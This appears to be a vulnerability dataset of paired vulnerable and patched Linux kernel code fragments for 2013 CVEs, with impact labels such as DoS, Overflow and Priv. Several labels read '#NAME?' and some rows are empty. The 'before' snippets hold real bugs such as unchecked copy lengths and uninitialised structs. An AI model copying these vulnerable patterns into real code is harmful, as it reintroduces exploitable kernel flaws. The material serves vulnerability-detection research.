 case KVM_SET_ONE_REG:
 case KVM_GET_ONE_REG: {
 struct kvm_one_reg reg;

 if (unlikely(!kvm_vcpu_initialized(vcpu)))
 return -ENOEXEC;

 if (copy_from_user(&reg, argp, sizeof(reg)))
 return -EFAULT;
 if (ioctl == KVM_SET_ONE_REG)
 struct kvm_reg_list reg_list;
 unsigned n;

 if (unlikely(!kvm_vcpu_initialized(vcpu)))
 return -ENOEXEC;

 if (copy_from_user(&reg_list, user_list, sizeof(reg_list)))
 return -EFAULT;
		n = reg_list.n;
"
2013,DoS ,CVE-2013-4592," /* destroy any largepage mappings for dirty tracking */
	}

 if (!npages) {
 struct kvm_memory_slot *slot;

		r = -ENOMEM;
		old_memslots = kvm->memslots;
 rcu_assign_pointer(kvm->memslots, slots);
 synchronize_srcu_expedited(&kvm->srcu);
 /* From this point no new shadow pages pointing to a deleted
		 * memslot will be created.
		 *
		 * validation of sp->gfn happens in:
		 * 	- gfn_to_hva (kvm_read_guest, gfn_to_pfn)
"," /* destroy any largepage mappings for dirty tracking */
	}

 if (!npages || base_gfn != old.base_gfn) {
 struct kvm_memory_slot *slot;

		r = -ENOMEM;
		old_memslots = kvm->memslots;
 rcu_assign_pointer(kvm->memslots, slots);
 synchronize_srcu_expedited(&kvm->srcu);
 /* From this point no new shadow pages pointing to a deleted,
		 * or moved, memslot will be created.
		 *
		 * validation of sp->gfn happens in:
		 * 	- gfn_to_hva (kvm_read_guest, gfn_to_pfn)
"
2013,DoS Overflow Mem. Corr. ,CVE-2013-4591," goto out_free;
	}
 nfs4_write_cached_acl(inode, pages, res.acl_data_offset, res.acl_len);
 if (buf)




 _copy_from_pages(buf, pages, res.acl_data_offset, res.acl_len);

out_ok:
	ret = res.acl_len;
out_free:
"," goto out_free;
	}
 nfs4_write_cached_acl(inode, pages, res.acl_data_offset, res.acl_len);
 if (buf) {
 if (res.acl_len > buflen) {
			ret = -ERANGE;
 goto out_free;
		}
 _copy_from_pages(buf, pages, res.acl_data_offset, res.acl_len);
	}
out_ok:
	ret = res.acl_len;
out_free:
"
2013,Overflow +Priv ,CVE-2013-4588," if (!capable(CAP_NET_ADMIN))
 return -EPERM;





 if (len != set_arglen[SET_CMDID(cmd)]) {
 pr_err(""set_ctl: len %u != %u\n"",
		       len, set_arglen[SET_CMDID(cmd)]);
{
 unsigned char arg[128];
 int ret = 0;


 if (!capable(CAP_NET_ADMIN))
 return -EPERM;




 if (*len < get_arglen[GET_CMDID(cmd)]) {
 pr_err(""get_ctl: len %u < %u\n"",
		       *len, get_arglen[GET_CMDID(cmd)]);
 return -EINVAL;
	}

 if (copy_from_user(arg, user, get_arglen[GET_CMDID(cmd)]) != 0)




 return -EFAULT;

 if (mutex_lock_interruptible(&__ip_vs_mutex))
"," if (!capable(CAP_NET_ADMIN))
 return -EPERM;

 if (cmd < IP_VS_BASE_CTL || cmd > IP_VS_SO_SET_MAX)
 return -EINVAL;
 if (len < 0 || len >  MAX_ARG_LEN)
 return -EINVAL;
 if (len != set_arglen[SET_CMDID(cmd)]) {
 pr_err(""set_ctl: len %u != %u\n"",
		       len, set_arglen[SET_CMDID(cmd)]);
{
 unsigned char arg[128];
 int ret = 0;
 unsigned int copylen;

 if (!capable(CAP_NET_ADMIN))
 return -EPERM;

 if (cmd < IP_VS_BASE_CTL || cmd > IP_VS_SO_GET_MAX)
 return -EINVAL;

 if (*len < get_arglen[GET_CMDID(cmd)]) {
 pr_err(""get_ctl: len %u < %u\n"",
		       *len, get_arglen[GET_CMDID(cmd)]);
 return -EINVAL;
	}

	copylen = get_arglen[GET_CMDID(cmd)];
 if (copylen > 128)
 return -EINVAL;

 if (copy_from_user(arg, user, copylen) != 0)
 return -EFAULT;

 if (mutex_lock_interruptible(&__ip_vs_mutex))
"
2013,#NAME?,CVE-2013-4587," int r;
 struct kvm_vcpu *vcpu, *v;




	vcpu = kvm_arch_vcpu_create(kvm, id);
 if (IS_ERR(vcpu))
 return PTR_ERR(vcpu);
"," int r;
 struct kvm_vcpu *vcpu, *v;

 if (id >= KVM_MAX_VCPUS)
 return -EINVAL;

	vcpu = kvm_arch_vcpu_create(kvm, id);
 if (IS_ERR(vcpu))
 return PTR_ERR(vcpu);
"
2013,,CVE-2013-4579,,
2013,DoS ,CVE-2013-4563,"
 /* Check if there is enough headroom to insert fragment header. */
		tnl_hlen = skb_tnl_header_len(skb);
 if (skb_headroom(skb) < (tnl_hlen + frag_hdr_sz)) {
 if (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))
 goto out;
		}
","
 /* Check if there is enough headroom to insert fragment header. */
		tnl_hlen = skb_tnl_header_len(skb);
 if (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {
 if (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))
 goto out;
		}
"
2013,#NAME?,CVE-2013-4516,"
static int mp_get_count(struct sb_uart_state *state, struct serial_icounter_struct *icnt)
{
 struct serial_icounter_struct icount;
 struct sb_uart_icount cnow;
 struct sb_uart_port *port = state->port;

","
static int mp_get_count(struct sb_uart_state *state, struct serial_icounter_struct *icnt)
{
 struct serial_icounter_struct icount = {};
 struct sb_uart_icount cnow;
 struct sb_uart_port *port = state->port;

"
2013,#NAME?,CVE-2013-4515,"
 BCM_DEBUG_PRINT(Adapter, DBG_TYPE_OTHERS, OSAL_DBG, DBG_LVL_ALL, ""Called IOCTL_BCM_GET_DEVICE_DRIVER_INFO\n"");


		DevInfo.MaxRDMBufferSize = BUFFER_4K;
		DevInfo.u32DSDStartOffset = EEPROM_CALPARAM_START;
		DevInfo.u32RxAlignmentCorrection = 0;
","
 BCM_DEBUG_PRINT(Adapter, DBG_TYPE_OTHERS, OSAL_DBG, DBG_LVL_ALL, ""Called IOCTL_BCM_GET_DEVICE_DRIVER_INFO\n"");

 memset(&DevInfo, 0, sizeof(DevInfo));
		DevInfo.MaxRDMBufferSize = BUFFER_4K;
		DevInfo.u32DSDStartOffset = EEPROM_CALPARAM_START;
		DevInfo.u32RxAlignmentCorrection = 0;
"
2013,DoS Overflow ,CVE-2013-4514," ltv_t                   *pLtv;
 bool_t                  ltvAllocated = FALSE;
	ENCSTRCT                sEncryption;


#ifdef USE_WDS
	hcf_16                  hcfPort  = HCF_PORT_0;
 break;
 case CFG_CNF_OWN_NAME:
 memset(lp->StationName, 0, sizeof(lp->StationName));
 memcpy((void *)lp->StationName, (void *)&pLtv->u.u8[2], (size_t)pLtv->u.u16[0]);

					pLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);
 break;
 case CFG_CNF_LOAD_BALANCING:
{
 struct wl_private *lp = wl_priv(dev);
 unsigned long flags;

 int         ret = 0;
 /*------------------------------------------------------------------------*/

 wl_lock(lp, &flags);

 memset(lp->StationName, 0, sizeof(lp->StationName));

 memcpy(lp->StationName, extra, wrqu->data.length);

 /* Commit the adapter parameters */
 wl_apply(lp);
"," ltv_t                   *pLtv;
 bool_t                  ltvAllocated = FALSE;
	ENCSTRCT                sEncryption;
 size_t			len;

#ifdef USE_WDS
	hcf_16                  hcfPort  = HCF_PORT_0;
 break;
 case CFG_CNF_OWN_NAME:
 memset(lp->StationName, 0, sizeof(lp->StationName));
					len = min_t(size_t, pLtv->u.u16[0], sizeof(lp->StationName));
 strlcpy(lp->StationName, &pLtv->u.u8[2], len);
					pLtv->u.u16[0] = CNV_INT_TO_LITTLE(pLtv->u.u16[0]);
 break;
 case CFG_CNF_LOAD_BALANCING:
{
 struct wl_private *lp = wl_priv(dev);
 unsigned long flags;
 size_t len;
 int         ret = 0;
 /*------------------------------------------------------------------------*/

 wl_lock(lp, &flags);

 memset(lp->StationName, 0, sizeof(lp->StationName));
	len = min_t(size_t, wrqu->data.length, sizeof(lp->StationName));
 strlcpy(lp->StationName, extra, len);

 /* Commit the adapter parameters */
 wl_apply(lp);
"
2013,DoS Overflow ,CVE-2013-4513," struct oz_app_hdr *app_hdr;
 struct oz_serial_ctx *ctx;




 spin_lock_bh(&g_cdev.lock);
	pd = g_cdev.active_pd;
 if (pd)
"," struct oz_app_hdr *app_hdr;
 struct oz_serial_ctx *ctx;

 if (count > sizeof(ei->data) - sizeof(*elt) - sizeof(*app_hdr))
 return -EINVAL;

 spin_lock_bh(&g_cdev.lock);
	pd = g_cdev.active_pd;
 if (pd)
"
2013,DoS Overflow ,CVE-2013-4512," const char __user *buffer, size_t count, loff_t *pos)
{
 char *end, buf[sizeof(""nnnnn\0"")];

 int tmp;

 if (copy_from_user(buf, buffer, count))

 return -EFAULT;

	tmp = simple_strtol(buf, &end, 0);
"," const char __user *buffer, size_t count, loff_t *pos)
{
 char *end, buf[sizeof(""nnnnn\0"")];
 size_t size;
 int tmp;

	size = min(count, sizeof(buf));
 if (copy_from_user(buf, buffer, size))
 return -EFAULT;

	tmp = simple_strtol(buf, &end, 0);
"
2013,Overflow +Priv ,CVE-2013-4511,"{
 struct uio_device *idev = vma->vm_private_data;
 int mi = uio_find_mem_index(vma);

 if (mi < 0)
 return -EINVAL;


	vma->vm_ops = &uio_physical_vm_ops;



	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);










 return remap_pfn_range(vma,
			       vma->vm_start,
 idev->info->mem[mi].addr >> PAGE_SHIFT,
			       vma->vm_end - vma->vm_start,
			       vma->vm_page_prot);
}
int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)
{
 struct au1100fb_device *fbdev;
 unsigned int len;
 unsigned long start=0, off;

	fbdev = to_au1100fb_device(fbi);

 if (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {
 return -EINVAL;
	}

	start = fbdev->fb_phys & PAGE_MASK;
	len = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);

	off = vma->vm_pgoff << PAGE_SHIFT;

 if ((vma->vm_end - vma->vm_start + off) > len) {
 return -EINVAL;
	}

	off += start;
	vma->vm_pgoff = off >> PAGE_SHIFT;

	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6

 if (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,
				vma->vm_end - vma->vm_start,
				vma->vm_page_prot)) {
 return -EAGAIN;
	}

 return 0;
}

static struct fb_ops au1100fb_ops =
 * method mainly to allow the use of the TLB streaming flag (CCA=6)
 */
static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)

{
 unsigned int len;
 unsigned long start=0, off;
 struct au1200fb_device *fbdev = info->par;

 if (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {
 return -EINVAL;
	}

	start = fbdev->fb_phys & PAGE_MASK;
	len = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);

	off = vma->vm_pgoff << PAGE_SHIFT;

 if ((vma->vm_end - vma->vm_start + off) > len) {
 return -EINVAL;
	}

	off += start;
	vma->vm_pgoff = off >> PAGE_SHIFT;

	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */

 return io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,
				  vma->vm_end - vma->vm_start,
				  vma->vm_page_prot);
}

static void set_global(u_int cmd, struct au1200_lcd_global_regs_t *pdata)
","{
 struct uio_device *idev = vma->vm_private_data;
 int mi = uio_find_mem_index(vma);
 struct uio_mem *mem;
 if (mi < 0)
 return -EINVAL;
	mem = idev->info->mem + mi;

 if (vma->vm_end - vma->vm_start > mem->size)
 return -EINVAL;

	vma->vm_ops = &uio_physical_vm_ops;
	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);

 /*
	 * We cannot use the vm_iomap_memory() helper here,
	 * because vma->vm_pgoff is the map index we looked
	 * up above in uio_find_mem_index(), rather than an
	 * actual page offset into the mmap.
	 *
	 * So we just do the physical mmap without a page
	 * offset.
 */
 return remap_pfn_range(vma,
			       vma->vm_start,
 mem->addr >> PAGE_SHIFT,
			       vma->vm_end - vma->vm_start,
			       vma->vm_page_prot);
}
int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)
{
 struct au1100fb_device *fbdev;



	fbdev = to_au1100fb_device(fbi);

















	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6

 return vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);






}

static struct fb_ops au1100fb_ops =
 * method mainly to allow the use of the TLB streaming flag (CCA=6)
 */
static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)

{


 struct au1200fb_device *fbdev = info->par;

















	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */

 return vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);


}

static void set_global(u_int cmd, struct au1200_lcd_global_regs_t *pdata)
"
2013,DoS ,CVE-2013-4483," goto out_unlock_free;
		}
 ss_add(msq, &s);
 ipc_rcu_getref(msq);





 msg_unlock(msq);
 schedule();

"," goto out_unlock_free;
		}
 ss_add(msq, &s);

 if (!ipc_rcu_getref(msq)) {
			err = -EIDRM;
 goto out_unlock_free;
		}

 msg_unlock(msq);
 schedule();

"
2013,DoS +Priv Mem. Corr. ,CVE-2013-4470,"
{
 struct sk_buff *skb;

 int err;

 /* There is support for UDP large send offload by network
	 * device, so create one single skb packet containing complete
	 * udp datagram
 */
 if ((skb = skb_peek_tail(&sk->sk_write_queue)) == NULL) {
 struct frag_hdr fhdr;

		skb = sock_alloc_send_skb(sk,
			hh_len + fragheaderlen + transhdrlen + 20,
			(flags & MSG_DONTWAIT), &err);
		skb->transport_header = skb->network_header + fragheaderlen;

		skb->protocol = htons(ETH_P_IPV6);
		skb->ip_summed = CHECKSUM_PARTIAL;
		skb->csum = 0;

 /* Specify the length of each IPv6 datagram fragment.
		 * It has to be a multiple of 8.
 */
 skb_shinfo(skb)->gso_size = (mtu - fragheaderlen -
 sizeof(struct frag_hdr)) & ~7;
 skb_shinfo(skb)->gso_type = SKB_GSO_UDP;
 ipv6_select_ident(&fhdr, rt);
 skb_shinfo(skb)->ip6_frag_id = fhdr.identification;
 __skb_queue_tail(&sk->sk_write_queue, skb);


	}












 return skb_append_datato_frags(sk, skb, getfrag, from,
				       (length - transhdrlen));
}
","
{
 struct sk_buff *skb;
 struct frag_hdr fhdr;
 int err;

 /* There is support for UDP large send offload by network
	 * device, so create one single skb packet containing complete
	 * udp datagram
 */
 if ((skb = skb_peek_tail(&sk->sk_write_queue)) == NULL) {


		skb = sock_alloc_send_skb(sk,
			hh_len + fragheaderlen + transhdrlen + 20,
			(flags & MSG_DONTWAIT), &err);
		skb->transport_header = skb->network_header + fragheaderlen;

		skb->protocol = htons(ETH_P_IPV6);

		skb->csum = 0;









 __skb_queue_tail(&sk->sk_write_queue, skb);
	} else if (skb_is_gso(skb)) {
 goto append;
	}

	skb->ip_summed = CHECKSUM_PARTIAL;
 /* Specify the length of each IPv6 datagram fragment.
	 * It has to be a multiple of 8.
 */
 skb_shinfo(skb)->gso_size = (mtu - fragheaderlen -
 sizeof(struct frag_hdr)) & ~7;
 skb_shinfo(skb)->gso_type = SKB_GSO_UDP;
 ipv6_select_ident(&fhdr, rt);
 skb_shinfo(skb)->ip6_frag_id = fhdr.identification;

append:
 return skb_append_datato_frags(sk, skb, getfrag, from,
				       (length - transhdrlen));
}
"
2013,DoS Overflow Mem. Corr. ,CVE-2013-4387,"	 * udp datagram
 */
 if ((skb = skb_peek_tail(&sk->sk_write_queue)) == NULL) {


		skb = sock_alloc_send_skb(sk,
			hh_len + fragheaderlen + transhdrlen + 20,
			(flags & MSG_DONTWAIT), &err);
		skb->protocol = htons(ETH_P_IPV6);
		skb->ip_summed = CHECKSUM_PARTIAL;
		skb->csum = 0;
	}

	err = skb_append_datato_frags(sk,skb, getfrag, from,
				      (length - transhdrlen));
 if (!err) {
 struct frag_hdr fhdr;

 /* Specify the length of each IPv6 datagram fragment.
		 * It has to be a multiple of 8.
 ipv6_select_ident(&fhdr, rt);
 skb_shinfo(skb)->ip6_frag_id = fhdr.identification;
 __skb_queue_tail(&sk->sk_write_queue, skb);

 return 0;
	}
 /* There is not enough support do UPD LSO,
	 * so follow normal path
 */
 kfree_skb(skb);

 return err;

}

static inline struct ipv6_opt_hdr *ip6_opt_dup(struct ipv6_opt_hdr *src,
	 * --yoshfuji
 */

	cork->length += length;
 if (length > mtu) {
 int proto = sk->sk_protocol;
 if (dontfrag && (proto == IPPROTO_UDP || proto == IPPROTO_RAW)){
 ipv6_local_rxpmtu(sk, fl6, mtu-exthdrlen);
 return -EMSGSIZE;
		}

 if (proto == IPPROTO_UDP &&
		    (rt->dst.dev->features & NETIF_F_UFO)) {

			err = ip6_ufo_append_data(sk, getfrag, from, length,
						  hh_len, fragheaderlen,
						  transhdrlen, mtu, flags, rt);
 if (err)
 goto error;
 return 0;
		}





	}

 if ((skb = skb_peek_tail(&sk->sk_write_queue)) == NULL)
 goto alloc_new_skb;

 while (length > 0) {
","	 * udp datagram
 */
 if ((skb = skb_peek_tail(&sk->sk_write_queue)) == NULL) {
 struct frag_hdr fhdr;

		skb = sock_alloc_send_skb(sk,
			hh_len + fragheaderlen + transhdrlen + 20,
			(flags & MSG_DONTWAIT), &err);
		skb->protocol = htons(ETH_P_IPV6);
		skb->ip_summed = CHECKSUM_PARTIAL;
		skb->csum = 0;







 /* Specify the length of each IPv6 datagram fragment.
		 * It has to be a multiple of 8.
 ipv6_select_ident(&fhdr, rt);
 skb_shinfo(skb)->ip6_frag_id = fhdr.identification;
 __skb_queue_tail(&sk->sk_write_queue, skb);


	}





 return skb_append_datato_frags(sk, skb, getfrag, from,
				       (length - transhdrlen));
}

static inline struct ipv6_opt_hdr *ip6_opt_dup(struct ipv6_opt_hdr *src,
	 * --yoshfuji
 */

 if ((length > mtu) && dontfrag && (sk->sk_protocol == IPPROTO_UDP ||
					   sk->sk_protocol == IPPROTO_RAW)) {
 ipv6_local_rxpmtu(sk, fl6, mtu-exthdrlen);
 return -EMSGSIZE;
	}






	skb = skb_peek_tail(&sk->sk_write_queue);
	cork->length += length;
 if (((length > mtu) ||
	     (skb && skb_is_gso(skb))) &&
	    (sk->sk_protocol == IPPROTO_UDP) &&
	    (rt->dst.dev->features & NETIF_F_UFO)) {
		err = ip6_ufo_append_data(sk, getfrag, from, length,
					  hh_len, fragheaderlen,
					  transhdrlen, mtu, flags, rt);
 if (err)
 goto error;
 return 0;
	}

 if (!skb)
 goto alloc_new_skb;

 while (length > 0) {
"
2013,#NAME?,CVE-2013-4350," in6_dev_put(idev);
}

/* Based on tcp_v6_xmit() in tcp_ipv6.c. */
static int sctp_v6_xmit(struct sk_buff *skb, struct sctp_transport *transport)
{
 struct sock *sk = skb->sk;
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct flowi6 fl6;

 memset(&fl6, 0, sizeof(fl6));

	fl6.flowi6_proto = sk->sk_protocol;

 /* Fill in the dest address from the route entry passed with the skb
	 * and the source address from the transport.
 */
	fl6.daddr = transport->ipaddr.v6.sin6_addr;
	fl6.saddr = transport->saddr.v6.sin6_addr;

	fl6.flowlabel = np->flow_label;
 IP6_ECN_flow_xmit(sk, fl6.flowlabel);
 if (ipv6_addr_type(&fl6.saddr) & IPV6_ADDR_LINKLOCAL)
		fl6.flowi6_oif = transport->saddr.v6.sin6_scope_id;
 else
		fl6.flowi6_oif = sk->sk_bound_dev_if;

 if (np->opt && np->opt->srcrt) {
 struct rt0_hdr *rt0 = (struct rt0_hdr *) np->opt->srcrt;
		fl6.daddr = *rt0->addr;
	}

 pr_debug(""%s: skb:%p, len:%d, src:%pI6 dst:%pI6\n"", __func__, skb,
		 skb->len, &fl6.saddr, &fl6.daddr);

 SCTP_INC_STATS(sock_net(sk), SCTP_MIB_OUTSCTPPACKS);

 if (!(transport->param_flags & SPP_PMTUD_ENABLE))
		skb->local_df = 1;

 return ip6_xmit(sk, skb, &fl6, np->opt, np->tclass);


}

/* Returns the dst cache entry for the given source and destination ip
 struct dst_entry *dst = NULL;
 struct flowi6 *fl6 = &fl->u.ip6;
 struct sctp_bind_addr *bp;

 struct sctp_sockaddr_entry *laddr;
 union sctp_addr *baddr = NULL;
 union sctp_addr *daddr = &t->ipaddr;
 union sctp_addr dst_saddr;

	__u8 matchlen = 0;
	__u8 bmatchlen;
 sctp_scope_t scope;
 pr_debug(""src=%pI6 - "", &fl6->saddr);
	}

	dst = ip6_dst_lookup_flow(sk, fl6, NULL, false);

 if (!asoc || saddr)
 goto out;

		}
	}
 rcu_read_unlock();

 if (baddr) {
		fl6->saddr = baddr->v6.sin6_addr;
		fl6->fl6_sport = baddr->v6.sin6_port;
		dst = ip6_dst_lookup_flow(sk, fl6, NULL, false);

	}

out:
"," in6_dev_put(idev);
}


static int sctp_v6_xmit(struct sk_buff *skb, struct sctp_transport *transport)
{
 struct sock *sk = skb->sk;
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct flowi6 *fl6 = &transport->fl.u.ip6;























 pr_debug(""%s: skb:%p, len:%d, src:%pI6 dst:%pI6\n"", __func__, skb,
		 skb->len, &fl6->saddr, &fl6->daddr);

 IP6_ECN_flow_xmit(sk, fl6->flowlabel);

 if (!(transport->param_flags & SPP_PMTUD_ENABLE))
		skb->local_df = 1;

 SCTP_INC_STATS(sock_net(sk), SCTP_MIB_OUTSCTPPACKS);

 return ip6_xmit(sk, skb, fl6, np->opt, np->tclass);
}

/* Returns the dst cache entry for the given source and destination ip
 struct dst_entry *dst = NULL;
 struct flowi6 *fl6 = &fl->u.ip6;
 struct sctp_bind_addr *bp;
 struct ipv6_pinfo *np = inet6_sk(sk);
 struct sctp_sockaddr_entry *laddr;
 union sctp_addr *baddr = NULL;
 union sctp_addr *daddr = &t->ipaddr;
 union sctp_addr dst_saddr;
 struct in6_addr *final_p, final;
	__u8 matchlen = 0;
	__u8 bmatchlen;
 sctp_scope_t scope;
 pr_debug(""src=%pI6 - "", &fl6->saddr);
	}

	final_p = fl6_update_dst(fl6, np->opt, &final);
	dst = ip6_dst_lookup_flow(sk, fl6, final_p, false);
 if (!asoc || saddr)
 goto out;

		}
	}
 rcu_read_unlock();

 if (baddr) {
		fl6->saddr = baddr->v6.sin6_addr;
		fl6->fl6_sport = baddr->v6.sin6_port;
		final_p = fl6_update_dst(fl6, np->opt, &final);
		dst = ip6_dst_lookup_flow(sk, fl6, final_p, false);
	}

out:
"
2013,DoS ,CVE-2013-4348,,
2013,,CVE-2013-4345,,
2013,#NAME?,CVE-2013-4343,,
2016,DoS Overflow Bypass ,CVE-2013-4312," unsigned long mq_bytes;	/* How many bytes can be allocated to mqueue? */
#endif
 unsigned long locked_shm; /* How many pages of mlocked shm ? */


#ifdef CONFIG_KEYS
 struct key *uid_keyring;	/* UID specific keyring */
 sock_wfree(skb);
}
















#define MAX_RECURSION_LEVEL 4

static int unix_attach_fds(struct scm_cookie *scm, struct sk_buff *skb)
 unsigned char max_level = 0;
 int unix_sock_count = 0;




 for (i = scm->fp->count - 1; i >= 0; i--) {
 struct sock *sk = unix_get_socket(scm->fp->fp[i]);

 if (!UNIXCB(skb).fp)
 return -ENOMEM;

 if (unix_sock_count) {
 for (i = scm->fp->count - 1; i >= 0; i--)
 unix_inflight(scm->fp->fp[i]);
	}
 return max_level;
}

{
 struct sock *s = unix_get_socket(fp);



 if (s) {
 struct unix_sock *u = unix_sk(s);

 spin_lock(&unix_gc_lock);

 if (atomic_long_inc_return(&u->inflight) == 1) {
 BUG_ON(!list_empty(&u->link));
 list_add_tail(&u->link, &gc_inflight_list);
		} else {
 BUG_ON(list_empty(&u->link));
		}
		unix_tot_inflight++;
 spin_unlock(&unix_gc_lock);
	}


}

void unix_notinflight(struct file *fp)
{
 struct sock *s = unix_get_socket(fp);



 if (s) {
 struct unix_sock *u = unix_sk(s);

 spin_lock(&unix_gc_lock);
 BUG_ON(list_empty(&u->link));

 if (atomic_long_dec_and_test(&u->inflight))
 list_del_init(&u->link);
		unix_tot_inflight--;
 spin_unlock(&unix_gc_lock);
	}


}

static void scan_inflight(struct sock *x, void (*func)(struct unix_sock *),
"," unsigned long mq_bytes;	/* How many bytes can be allocated to mqueue? */
#endif
 unsigned long locked_shm; /* How many pages of mlocked shm ? */
 unsigned long unix_inflight;	/* How many files in flight in unix sockets */

#ifdef CONFIG_KEYS
 struct key *uid_keyring;	/* UID specific keyring */
 sock_wfree(skb);
}

/*
 * The ""user->unix_inflight"" variable is protected by the garbage
 * collection lock, and we just read it locklessly here. If you go
 * over the limit, there might be a tiny race in actually noticing
 * it across threads. Tough.
 */
static inline bool too_many_unix_fds(struct task_struct *p)
{
 struct user_struct *user = current_user();

 if (unlikely(user->unix_inflight > task_rlimit(p, RLIMIT_NOFILE)))
 return !capable(CAP_SYS_RESOURCE) && !capable(CAP_SYS_ADMIN);
 return false;
}

#define MAX_RECURSION_LEVEL 4

static int unix_attach_fds(struct scm_cookie *scm, struct sk_buff *skb)
 unsigned char max_level = 0;
 int unix_sock_count = 0;

 if (too_many_unix_fds(current))
 return -ETOOMANYREFS;

 for (i = scm->fp->count - 1; i >= 0; i--) {
 struct sock *sk = unix_get_socket(scm->fp->fp[i]);

 if (!UNIXCB(skb).fp)
 return -ENOMEM;

 for (i = scm->fp->count - 1; i >= 0; i--)
 unix_inflight(scm->fp->fp[i]);


 return max_level;
}

{
 struct sock *s = unix_get_socket(fp);

 spin_lock(&unix_gc_lock);

 if (s) {
 struct unix_sock *u = unix_sk(s);



 if (atomic_long_inc_return(&u->inflight) == 1) {
 BUG_ON(!list_empty(&u->link));
 list_add_tail(&u->link, &gc_inflight_list);
		} else {
 BUG_ON(list_empty(&u->link));
		}
		unix_tot_inflight++;

	}
	fp->f_cred->user->unix_inflight++;
 spin_unlock(&unix_gc_lock);
}

void unix_notinflight(struct file *fp)
{
 struct sock *s = unix_get_socket(fp);

 spin_lock(&unix_gc_lock);

 if (s) {
 struct unix_sock *u = unix_sk(s);


 BUG_ON(list_empty(&u->link));

 if (atomic_long_dec_and_test(&u->inflight))
 list_del_init(&u->link);
		unix_tot_inflight--;

	}
	fp->f_cred->user->unix_inflight--;
 spin_unlock(&unix_gc_lock);
}

static void scan_inflight(struct sock *x, void (*func)(struct unix_sock *),
"
2013,#NAME?,CVE-2013-4300," return -EINVAL;

 if ((creds->pid == task_tgid_vnr(current) ||
 ns_capable(current->nsproxy->pid_ns->user_ns, CAP_SYS_ADMIN)) &&
	    ((uid_eq(uid, cred->uid)   || uid_eq(uid, cred->euid) ||
 uid_eq(uid, cred->suid)) || nsown_capable(CAP_SETUID)) &&
	    ((gid_eq(gid, cred->gid)   || gid_eq(gid, cred->egid) ||
"," return -EINVAL;

 if ((creds->pid == task_tgid_vnr(current) ||
 ns_capable(task_active_pid_ns(current)->user_ns, CAP_SYS_ADMIN)) &&
	    ((uid_eq(uid, cred->uid)   || uid_eq(uid, cred->euid) ||
 uid_eq(uid, cred->suid)) || nsown_capable(CAP_SETUID)) &&
	    ((gid_eq(gid, cred->gid)   || gid_eq(gid, cred->egid) ||
"
2013,#NAME?,CVE-2013-4299," return NUM_SNAPSHOT_HDR_CHUNKS + ((ps->exceptions_per_area + 1) * area);
}









/*
 * Read or write a metadata area.  Remembering to skip the first
 * chunk which holds the header.

	ps->current_area--;



 return 0;
}

 struct dm_exception *e)
{
 struct pstore *ps = get_info(store);
 uint32_t stride;
 chunk_t next_free;
 sector_t size = get_dev_size(dm_snap_cow(store->snap)->bdev);

 /* Is there enough room ? */
	 * Move onto the next free pending, making sure to take
	 * into account the location of the metadata chunks.
 */
	stride = (ps->exceptions_per_area + 1);
	next_free = ++ps->next_free;
 if (sector_div(next_free, stride) == 1)
		ps->next_free++;

 atomic_inc(&ps->pending_count);
 return 0;
"," return NUM_SNAPSHOT_HDR_CHUNKS + ((ps->exceptions_per_area + 1) * area);
}

static void skip_metadata(struct pstore *ps)
{
 uint32_t stride = ps->exceptions_per_area + 1;
 chunk_t next_free = ps->next_free;
 if (sector_div(next_free, stride) == NUM_SNAPSHOT_HDR_CHUNKS)
		ps->next_free++;
}

/*
 * Read or write a metadata area.  Remembering to skip the first
 * chunk which holds the header.

	ps->current_area--;

 skip_metadata(ps);

 return 0;
}

 struct dm_exception *e)
{
 struct pstore *ps = get_info(store);


 sector_t size = get_dev_size(dm_snap_cow(store->snap)->bdev);

 /* Is there enough room ? */
	 * Move onto the next free pending, making sure to take
	 * into account the location of the metadata chunks.
 */
	ps->next_free++;
 skip_metadata(ps);



 atomic_inc(&ps->pending_count);
 return 0;
"
2013,Bypass ,CVE-2013-4270,"
 /* Allow network administrator to have same access as root. */
 if (ns_capable(net->user_ns, CAP_NET_ADMIN) ||
 uid_eq(root_uid, current_uid())) {
 int mode = (table->mode >> 6) & 7;
 return (mode << 6) | (mode << 3) | mode;
	}
 /* Allow netns root group to have the same access as the root group */
 if (gid_eq(root_gid, current_gid())) {
 int mode = (table->mode >> 3) & 7;
 return (mode << 3) | mode;
	}
","
 /* Allow network administrator to have same access as root. */
 if (ns_capable(net->user_ns, CAP_NET_ADMIN) ||
 uid_eq(root_uid, current_euid())) {
 int mode = (table->mode >> 6) & 7;
 return (mode << 6) | (mode << 3) | mode;
	}
 /* Allow netns root group to have the same access as the root group */
 if (in_egroup_p(root_gid)) {
 int mode = (table->mode >> 3) & 7;
 return (mode << 3) | mode;
	}
"
2013,DoS +Priv ,CVE-2013-4254," struct arm_pmu *armpmu = to_arm_pmu(event->pmu);
 struct pmu *leader_pmu = event->group_leader->pmu;




 if (event->pmu != leader_pmu || event->state < PERF_EVENT_STATE_OFF)
